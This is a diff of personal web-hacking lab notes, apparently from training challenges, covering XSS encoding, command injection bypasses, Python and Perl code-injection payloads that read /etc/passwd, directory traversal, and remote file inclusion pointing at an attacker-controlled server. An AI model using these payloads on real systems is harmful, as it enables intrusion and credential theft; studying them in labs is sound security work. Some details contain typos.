@@ -1,5 +1,5 @@
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                  XSS tricks
+									XSS tricks
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Pick a payload : 123'"<t>
 Inject the payload
@@ -14,7 +14,7 @@ Hex : <  0x3ce ---> &#x3e; | " 0x22 ---> &#x22; | & 0x26 ---> &#x26;
 Decimal : ' decimal value 39 ---> &#39; | < 60 ---> &#60
 How does  encoding impact Xss
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                        Code execution PHP web app [0]
+									Code execution PHP web app [0]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Command injection can be used to run arbitrary commands on a server.
 
@@ -30,13 +30,13 @@ command1 || command2 that will run command2 if command1 fails.
 command1; command2 that will run command1 then command2.
 command1 | command2 that will run command1 and send the output of command1 to command2.
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                        Code execution PHP web app [1]
+									Code execution PHP web app [1]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In this case, the developer fixed the issue from the previous one and has started filtering some special characters.
 However, the developer forgot that you can use `command` to run a command.
 So when we inject something like ?ip=`id` we got this output: ping -c 2 `id` no errors and our command is printed back, it may seems like it's not executed but who knows maybe its a blind injection so to make sure if it executed or not, we can inject a reverse shell and check if we can get a reverse connection to our machine
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                        Code execution PHP web app [2]
+									Code execution PHP web app [2]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In this challenge, the developer fixed the previous issue and is now filtering on even more special characters.
 However, the developer forgot that you can use $(command) to run a command.
@@ -46,7 +46,7 @@ So our bypass will be like this :
 2/ ping an external host that we own and check the logs
 3/ curl  to read or download a file from our own server and check the logs
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                        Code execution Paython web app: [0]
+									Code execution Paython web app: [0]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Even if the path is like this Target/hello/hacker
 try to add " or ' at the end of its cause it maybe takes parameters, if you got an error,
@@ -55,7 +55,7 @@ some times you will have RCE but your payload won't work for example
 os.system('id') this may be because the module os is not imported, so one thing we can do 
 __import__('os').system('id') this may not work for many reasons so we need to play with the payload so it match our entry case we can use something like this "%2bstr(__import__('os').popen('id').read())%2b"
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                        Code execution Python web app: [1]
+									Code execution Python web app: [1]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 In other cases the first payload may not work because of some kind of restrinction maybe a waf, so we need to try encoding somthing like this "%2bstr(__import__('os').popen('"cat%20%252FEtc%252FPasswd').read())%2b"
 Here we werent able to execute or normal "cat /etc/passwd" and by playing with the payload we understood that the "/" is the character that cause the error, so by urlencoding it we bypassed the error but with no result!
@@ -67,7 +67,7 @@ import base65; b64decode(...)
 __import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')
 " + str(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')).read()) +"
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                        Code injection in Perl: [0]
+									Code injection in Perl: [0]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 So in this application we have an endpoit like this :
 http://Target/#hacker and by itercepting request using developer tool we can see that a page with this parametres load /cgi-bin/hello?name=hacker so if we go to it we will get json result :
@@ -82,7 +82,7 @@ So we know that '' can be used to give us an empty string so what if we concaten
 What about using backtiks to make try making id command executable
 6] http://Target/cgi-bin/hello?name=hacker'.`id`.' ---> {"str":"Hello hackeruid=33(www-data) gid=33(www-data) groups=33(www-data) [Voilla]
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                        Directory Traversals
+									Directory Traversals
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Directory traversals come from a lack of filtering/encoding of information used as part of a path by an application.
 
@@ -170,4 +170,8 @@ Basically, the payload will work fine if the poc was .PHP but the output will no
 It's so simple we will need to passe the c variable like this poc.txt&c=cmd so our final exploit will be like this: Target/?page=http://IPofmyServer/poc.txt&c=cmd
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 									          File Include [1]
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+In this case Our target is the same but the difference is that the end point is like this : http://Target/?page=page so we can see that the theres no extension or we can
+say that its given by the server, so how to bypass it ?
+Its simple we can use the same old payload but we need to use a random parameter to it to be like this Target/?page=http://IPofmyServer/poc.txt?random=&c=cmd
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
